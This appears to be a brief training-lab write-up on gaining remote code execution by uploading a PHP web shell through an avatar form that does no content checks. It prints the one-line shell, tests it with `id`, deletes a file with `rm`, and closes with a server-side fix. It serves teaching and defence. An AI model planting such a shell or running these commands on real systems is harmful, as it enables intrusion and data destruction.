# RCE via Web Shell Upload

Avatar upload accepts anything, no file type check on content, just stores whatever you send.

Uploaded a basic PHP shell:
```php
<?php echo system($_GET['cmd']); ?>
```
Grabbed the stored path from the upload response (`/files/avatars/shell.php`), hit it with `?cmd=id`, got command output back. Confirmed RCE. Ran `?cmd=rm /home/carlos/morale.txt` to finish the lab.

**Fix:** actually validate file content server-side, store uploads somewhere that can't execute scripts.
